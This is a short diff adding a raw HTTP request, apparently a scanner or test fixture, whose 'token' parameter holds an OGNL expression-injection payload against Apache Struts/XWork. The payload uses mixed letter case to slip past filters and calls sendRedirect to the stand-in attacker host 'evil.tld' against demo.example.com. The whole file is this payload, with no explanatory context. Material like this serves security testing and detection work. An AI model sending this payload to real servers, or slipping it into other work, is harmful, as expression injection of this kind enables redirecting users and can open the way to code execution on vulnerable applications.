@@ -1,0 +1,4 @@
+GET /a?token=%23cOnTeXt['CoM.oPeNsYmPhOnY.xWoRk2.DiSpAtChEr.HtTpSeRvLeTrEsPoNsE'].sEnDrEdIrEcT('hTtP://eViL.tLd') HTTP/1.1
+Host: demo.example.com
+Connection: close
+
